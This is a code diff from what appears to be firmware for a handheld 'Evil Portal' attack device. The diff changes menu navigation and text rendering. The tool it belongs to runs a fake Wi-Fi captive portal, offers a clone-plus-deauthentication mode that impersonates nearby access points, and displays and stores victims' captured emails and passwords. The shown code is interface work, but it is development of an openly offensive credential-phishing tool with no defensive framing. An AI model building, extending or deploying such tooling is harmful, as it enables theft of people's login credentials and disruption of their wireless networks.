@@ -292,11 +292,10 @@ static void drawMainMenu(int cursor) {
     const char* items[] = {
         "Iniciar Ataque",
         "Ver Logs Capturados",
-        "Borrar Todos los Logs",
-        "< BACK"
+        "Borrar Todos los Logs"
     };
 
-    for (int i = 0; i < 4; i++) {
+    for (int i = 0; i < 3; i++) {
         int y = 50 + i * 35;
         bool sel = (i == cursor);
         if (sel) tft.fillRect(5, y - 4, 310, 28, UI_SELECT);
@@ -307,7 +306,7 @@ static void drawMainMenu(int cursor) {
     int logCount = portalLogCount();
     tft.drawFastHLine(0, 215, 320, UI_ACCENT);
     drawStringCustom(10, 222,
-        "Logs guardados: " + String(logCount) + "/" + String(MAX_LOGS),
+        "Logs:" + String(logCount) + "/" + String(MAX_LOGS) + "  OK(HOLD):BACK",
         UI_ACCENT, 1);
 }
 
@@ -316,21 +315,22 @@ static int selectMainMenu() {
     drawMainMenu(cursor);
     while (true) {
         if (digitalRead(BTN_UP) == LOW) {
-            cursor = (cursor + 3) % 4;
+            cursor = (cursor + 2) % 3;
             beep(2100, 20);
             drawMainMenu(cursor);
             delay(180);
         }
         if (digitalRead(BTN_DOWN) == LOW) {
-            cursor = (cursor + 1) % 4;
+            cursor = (cursor + 1) % 3;
             beep(2100, 20);
             drawMainMenu(cursor);
             delay(180);
         }
         if (digitalRead(BTN_OK) == LOW) {
-            beep(1800, 40);
-            while (digitalRead(BTN_OK) == LOW) delay(5);
+            bool held = waitOkReleaseWasLong();
+            beep(held ? 1000 : 1800, 40);
             delay(100);
+            if (held) return -1;
             return cursor;
         }
         delay(20);
@@ -344,8 +344,7 @@ static int selectMainMenu() {
 static int selectMode() {
     const char* items[] = {
         "Modo SIMPLE",
-        "Modo CLONE + Deauth",
-        "< BACK"
+        "Modo CLONE + Deauth"
     };
     const char* descs[] = {
         "SSID predefinido",
@@ -360,7 +359,7 @@ static int selectMode() {
         drawStringBig(10, 8, "SELECT MODE", UI_MAIN, 1);
         tft.drawFastHLine(0, 30, 320, UI_ACCENT);
 
-        for (int i = 0; i < 3; i++) {
+    for (int i = 0; i < 2; i++) {
             int y = 50 + i * 40;
             bool sel = (i == cursor);
             if (sel) tft.fillRect(5, y - 4, 310, 34, UI_SELECT);
@@ -373,24 +372,24 @@ static int selectMode() {
         }
 
         tft.drawFastHLine(0, 215, 320, UI_ACCENT);
-        drawStringCustom(10, 222, "UP/DN:NAV  OK:SELECT", UI_ACCENT, 1);
+        drawStringCustom(10, 222, "OK:SELECT  OK(HOLD):BACK", UI_ACCENT, 1);
     };
     draw();
 
     while (true) {
         if (digitalRead(BTN_UP) == LOW) {
-            cursor = (cursor + 2) % 3;
+            cursor = (cursor + 1) % 2;
             beep(2100, 20); draw(); delay(180);
         }
         if (digitalRead(BTN_DOWN) == LOW) {
-            cursor = (cursor + 1) % 3;
+            cursor = (cursor + 1) % 2;
             beep(2100, 20); draw(); delay(180);
         }
         if (digitalRead(BTN_OK) == LOW) {
-            beep(1800, 40);
-            while (digitalRead(BTN_OK) == LOW) delay(5);
+            bool held = waitOkReleaseWasLong();
+            beep(held ? 1000 : 1800, 40);
             delay(100);
-            return cursor == 2 ? -1 : cursor;
+            return held ? -1 : cursor;
         }
         delay(20);
     }
@@ -403,7 +402,7 @@ static int selectMode() {
 static int selectPresetSSID() {
     int cursor = 0;
     int scrollOffset = 0;
-    int total = PRESET_COUNT + 1;
+    int total = PRESET_COUNT;
 
     auto draw = [&]() {
         tft.fillScreen(TFT_BLACK);
@@ -422,10 +421,11 @@ static int selectPresetSSID() {
             bool sel = (idx == cursor);
             if (sel) tft.fillRect(5, y, 310, rowH - 2, UI_SELECT);
             uint16_t col = sel ? UI_BG : UI_MAIN;
-            if (idx == PRESET_COUNT) {
-                drawStringCustom(15, y + 7, "< BACK", col, 2);
+            String ssid = String(PRESET_SSIDS[idx]);
+            if (getTextWidth(ssid, 2) <= 290) {
+                drawStringCustom(15, y + 7, ssid, col, 2);
             } else {
-                drawStringCustom(15, y + 7, PRESET_SSIDS[idx], col, 2);
+                drawStringFit(15, y + 12, ssid, col, 290, 1);
             }
         }
 
@@ -436,7 +436,7 @@ static int selectPresetSSID() {
         }
 
         tft.drawFastHLine(0, 215, 320, UI_ACCENT);
-        drawStringCustom(10, 222, "UP/DN:NAV  OK:START", UI_ACCENT, 1);
+        drawStringCustom(10, 222, "OK:START  OK(HOLD):BACK", UI_ACCENT, 1);
     };
     draw();
 
@@ -456,10 +456,10 @@ static int selectPresetSSID() {
             beep(2100, 20); draw(); delay(180);
         }
         if (digitalRead(BTN_OK) == LOW) {
-            beep(1800, 40);
-            while (digitalRead(BTN_OK) == LOW) delay(5);
+            bool held = waitOkReleaseWasLong();
+            beep(held ? 1000 : 1800, 40);
             delay(100);
-            if (cursor == PRESET_COUNT) return -1;
+            if (held) return -1;
             return cursor;
         }
         delay(20);
@@ -539,7 +539,7 @@ static int selectCloneTarget() {
 
     int cursor = 0;
     int scrollOffset = 0;
-    int total = scanAPCount + 1;
+    int total = scanAPCount;
 
     auto draw = [&]() {
         tft.fillScreen(TFT_BLACK);
@@ -559,26 +559,21 @@ static int selectCloneTarget() {
             uint16_t col1 = sel ? UI_BG : UI_MAIN;
             uint16_t col2 = sel ? UI_BG : UI_ACCENT;
 
-            if (idx == scanAPCount) {
-                drawStringCustom(10, y + 7, "< BACK", col1, 2);
-            } else {
-                String s = scanAPs[idx].ssid;
-                if (s.length() > 22) s = s.substring(0, 20) + "..";
-                drawStringCustom(10, y + 4, s, col1, 1);
-                String meta = "CH" + String(scanAPs[idx].channel) + " " +
-                              String(scanAPs[idx].rssi) + "dBm";
-                drawStringCustom(10, y + 15, meta, col2, 1);
-                int bars = rssiBars(scanAPs[idx].rssi);
-                int bx = 280, by = 22;
-                for (int b = 0; b < 4; b++) {
-                    int bh = 3 + b * 2;
-                    uint16_t c = (b < bars)
-                        ? (sel ? UI_BG : (bars >= 3 ? TFT_GREEN :
-                                          bars >= 2 ? TFT_YELLOW : TFT_ORANGE))
-                        : (sel ? UI_BG : UI_ACCENT);
-                    if (b < bars) tft.fillRect(bx + b*5, by - bh, 3, bh, c);
-                    else          tft.drawRect(bx + b*5, by - bh, 3, bh, c);
-                }
+            String s = scanAPs[idx].ssid;
+            drawStringFit(10, y + 4, s, col1, 255, 1);
+            String meta = "CH" + String(scanAPs[idx].channel) + " " +
+                          String(scanAPs[idx].rssi) + "dBm";
+            drawStringCustom(10, y + 15, meta, col2, 1);
+            int bars = rssiBars(scanAPs[idx].rssi);
+            int bx = 280, by = 22;
+            for (int b = 0; b < 4; b++) {
+                int bh = 3 + b * 2;
+                uint16_t c = (b < bars)
+                    ? (sel ? UI_BG : (bars >= 3 ? TFT_GREEN :
+                                      bars >= 2 ? TFT_YELLOW : TFT_ORANGE))
+                    : (sel ? UI_BG : UI_ACCENT);
+                if (b < bars) tft.fillRect(bx + b*5, by - bh, 3, bh, c);
+                else          tft.drawRect(bx + b*5, by - bh, 3, bh, c);
             }
         }
 
@@ -589,7 +584,7 @@ static int selectCloneTarget() {
         }
 
         tft.drawFastHLine(0, 215, 320, UI_ACCENT);
-        drawStringCustom(10, 222, "UP/DN:NAV  OK:CLONE", UI_ACCENT, 1);
+        drawStringCustom(10, 222, "OK:CLONE  OK(HOLD):BACK", UI_ACCENT, 1);
     };
     draw();
 
@@ -609,10 +604,10 @@ static int selectCloneTarget() {
             beep(2100, 20); draw(); delay(180);
         }
         if (digitalRead(BTN_OK) == LOW) {
-            beep(1800, 40);
-            while (digitalRead(BTN_OK) == LOW) delay(5);
+            bool held = waitOkReleaseWasLong();
+            beep(held ? 1000 : 1800, 40);
             delay(100);
-            if (cursor == scanAPCount) return -1;
+            if (held) return -1;
             return cursor;
         }
         delay(20);
@@ -630,9 +625,7 @@ static void drawDashboardFrame() {
 
     drawStringBig(10, 8, "PORTAL ACTIVE", UI_SELECT, 1);
 
-    String s = g_currentSSID;
-    if (s.length() > 20) s = s.substring(0, 18) + "..";
-    drawStringCustom(10, 30, "SSID: " + s, UI_MAIN, 1);
+    drawStringFit(10, 30, "SSID: " + g_currentSSID, UI_MAIN, 300, 1);
     if (g_cloneMode) {
         drawStringCustom(10, 42, "[CLONE+DEAUTH]", TFT_RED, 1);
         drawStringCustom(120, 42, "CH:" + String(g_cloneChannel), UI_ACCENT, 1);
@@ -664,12 +657,10 @@ static void drawDashboardStats() {
         drawStringCustom(15, 132, "Plataforma: " + g_lastCapturePlatform,
                          TFT_CYAN, 1);
         String em = g_lastCaptureEmail;
-        if (em.length() > 32) em = em.substring(0, 30) + "..";
-        drawStringCustom(15, 148, "User: " + em, UI_MAIN, 1);
+        drawStringFit(15, 148, "User: " + em, UI_MAIN, 290, 1);
 
         String pw = g_lastCapturePassword;
-        if (pw.length() > 32) pw = pw.substring(0, 30) + "..";
-        drawStringCustom(15, 164, "Pass: " + pw, UI_MAIN, 1);
+        drawStringFit(15, 164, "Pass: " + pw, UI_MAIN, 290, 1);
 
         unsigned long ago = (millis() - g_lastCaptureTime) / 1000;
         String agoStr = ago < 60 ? String(ago) + "s ago" :
@@ -757,6 +748,41 @@ static void runPortalLoop() {
 //  VISOR DE LOGS · letras grandes (size 2)
 // ═══════════════════════════════════════════════════════════════════════════
 
+static String truncateNativeToWidth(const String& txt, int maxWidth,
+                                    uint8_t font, uint8_t size) {
+    if (maxWidth <= 0) return "";
+    if (tft.nativeTextWidth(txt, font, size) <= maxWidth) return txt;
+
+    const String ellipsis = "..";
+    if (tft.nativeTextWidth(ellipsis, font, size) >= maxWidth) return "";
+
+    int lastGood = 0;
+    for (int i = 1; i <= (int)txt.length(); i++) {
+        String candidate = txt.substring(0, i) + ellipsis;
+        if (tft.nativeTextWidth(candidate, font, size) > maxWidth) break;
+        lastGood = i;
+    }
+    return (lastGood > 0) ? txt.substring(0, lastGood) + ellipsis : ellipsis;
+}
+
+static void drawNativeFit(int x, int y, const String& txt, uint16_t color,
+                          int maxWidth, uint8_t font = 2, uint8_t size = 1) {
+    tft.drawNativeStringTransparent(x, y,
+                                    truncateNativeToWidth(txt, maxWidth, font, size),
+                                    color, font, size);
+}
+
+static int drawLogDetailField(int y, const String& label, const String& value,
+                              uint16_t valueColor) {
+    drawStringCustom(12, y, label, UI_ACCENT, 1);
+    y += 11;
+
+    tft.drawRect(10, y - 2, 300, 25, UI_ACCENT);
+    tft.fillRect(11, y - 1, 298, 23, TFT_BLACK);
+    drawStringFit(15, y + 4, value, valueColor, 290, 1, FONT_BIG);
+    return y + 31;
+}
+
 static void showLogDetail(const PortalLog& log) {
     tft.fillScreen(TFT_BLACK);
     tft.drawRect(0, 0, 320, 240, UI_MAIN);
@@ -765,33 +791,15 @@ static void showLogDetail(const PortalLog& log) {
 
     int y = 40;
 
-    // Platform en BIG
-    drawStringCustom(10, y, "Platform:", UI_ACCENT, 1);
-    y += 12;
-    drawStringBig(15, y, String(log.platform), UI_SELECT, 1);
+    y = drawLogDetailField(y, "Platform", String(log.platform), UI_SELECT);
+    y = drawLogDetailField(y, "Email / User", String(log.email), UI_MAIN);
+    y = drawLogDetailField(y, "Password", String(log.password), TFT_RED);
+
+    drawStringFit(12, y, "SSID: " + String(log.ssid), UI_ACCENT, 296, 1);
     y += 18;
-
-    // Email en size 2
-    drawStringCustom(10, y, "Email / User:", UI_ACCENT, 1);
-    y += 12;
-    String em = String(log.email);
-    if (em.length() > 18) em = em.substring(0, 16) + "..";
-    drawStringCustom(15, y, em, UI_MAIN, 2);
-    y += 22;
-
-    // Password en size 2
-    drawStringCustom(10, y, "Password:", UI_ACCENT, 1);
-    y += 12;
-    String pw = String(log.password);
-    if (pw.length() > 18) pw = pw.substring(0, 16) + "..";
-    drawStringCustom(15, y, pw, TFT_RED, 2);
-    y += 22;
-
-    drawStringCustom(10, y, "SSID: " + String(log.ssid), UI_ACCENT, 1);
-    y += 12;
-    drawStringCustom(10, y, "Boot #" + String(log.bootNum) +
-                     "  @ " + String(log.timestampSec) + "s",
-                     UI_ACCENT, 1);
+    drawStringFit(12, y, "Boot #" + String(log.bootNum) +
+                  " @ " + String(log.timestampSec) + "s",
+                  UI_ACCENT, 296, 1);
 
     tft.drawFastHLine(0, 215, 320, UI_ACCENT);
     drawStringCustom(10, 222, "OK: Back", UI_ACCENT, 1);
@@ -820,7 +828,7 @@ static void viewLogs() {
 
     int cursor = 0;
     int scrollOffset = 0;
-    int total = count + 1;
+    int total = count;
 
     auto draw = [&]() {
         tft.fillScreen(TFT_BLACK);
@@ -842,18 +850,13 @@ static void viewLogs() {
             uint16_t col1 = sel ? UI_BG : UI_MAIN;
             uint16_t col2 = sel ? UI_BG : UI_ACCENT;
 
-            if (idx == count) {
-                drawStringCustom(15, y + 14, "< BACK", col1, 2);
-            } else {
-                PortalLog log;
-                if (portalLogGet(idx, log)) {
-                    String line1 = "[#" + String(idx + 1) + "] " +
-                                   String(log.platform);
-                    drawStringCustom(10, y + 4, line1, col1, 2);
-                    String em = String(log.email);
-                    if (em.length() > 20) em = em.substring(0, 18) + "..";
-                    drawStringCustom(10, y + 22, em, col2, 2);
-                }
+            PortalLog log;
+            if (portalLogGet(idx, log)) {
+                String line1 = "[#" + String(idx + 1) + "] " +
+                               String(log.platform);
+                drawStringFit(10, y + 4, line1, col1, 300, 1, FONT_BIG);
+                String em = String(log.email);
+                drawStringFit(10, y + 24, em, col2, 300, 1);
             }
         }
 
@@ -864,7 +867,7 @@ static void viewLogs() {
         }
 
         tft.drawFastHLine(0, 215, 320, UI_ACCENT);
-        drawStringCustom(10, 222, "UP/DN:NAV  OK:VER", UI_ACCENT, 1);
+        drawStringCustom(10, 222, "OK:VER  OK(HOLD):BACK", UI_ACCENT, 1);
     };
     draw();
 
@@ -882,10 +885,10 @@ static void viewLogs() {
             beep(2100, 20); draw(); delay(180);
         }
         if (digitalRead(BTN_OK) == LOW) {
-            beep(1800, 40);
-            while (digitalRead(BTN_OK) == LOW) delay(5);
+            bool held = waitOkReleaseWasLong();
+            beep(held ? 1000 : 1800, 40);
             delay(100);
-            if (cursor == count) break;
+            if (held) break;
             PortalLog log;
             if (portalLogGet(cursor, log)) {
                 showLogDetail(log);
@@ -990,6 +993,8 @@ void runEvilPortal() {
     while (true) {
         int choice = selectMainMenu();
         switch (choice) {
+            case -1:
+                return;
             case 0:
                 startAttackFlow();
                 break;
